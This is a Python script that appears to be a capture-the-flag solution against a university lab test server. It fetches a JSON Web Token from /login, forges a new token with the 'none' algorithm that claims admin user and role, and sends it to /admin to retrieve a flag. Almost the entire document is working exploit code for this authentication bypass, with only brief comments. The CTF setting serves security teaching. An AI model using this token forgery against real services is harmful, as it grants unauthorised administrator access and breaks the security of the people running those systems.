import urllib.request
import json
import base64

def b64_encode(s):
    return base64.urlsafe_b64encode(s.encode()).decode().rstrip("=")

def solve():
    base_url = "http://cns-test.idlab.uantwerpen.be:50009"
    
    # 1. Get initial token
    print("Fetching token from /login...")
    with urllib.request.urlopen(f"{base_url}/login") as response:
        data = json.loads(response.read().decode())
        token = data.get("token")
        print(f"Original Token: {token}")

    # 2. Craft malicious JWT with 'none' algorithm
    # The vulnerability is that the server trusts the 'alg' header in the JWT.
    # By setting it to 'none', we can bypass signature verification.
    header = {"alg": "none", "typ": "JWT"}
    payload = {"user": "admin", "role": "admin"}
    
    malicious_token = b64_encode(json.dumps(header)) + "." + b64_encode(json.dumps(payload)) + "."
    print(f"Malicious Token: {malicious_token}")

    # 3. Access /admin with the malicious token
    print("Accessing /admin...")
    req = urllib.request.Request(
        f"{base_url}/admin",
        headers={"Authorization": f"Bearer {malicious_token}"}
    )
    
    try:
        with urllib.request.urlopen(req) as response:
            result = json.loads(response.read().decode())
            print(f"Response: {result}")
            if "flag" in result:
                print(f"SUCCESS! Flag: {result['flag']}")
            else:
                print("Failed to get flag.")
    except urllib.error.HTTPError as e:
        print(f"HTTP Error {e.code}: {e.read().decode()}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    solve()
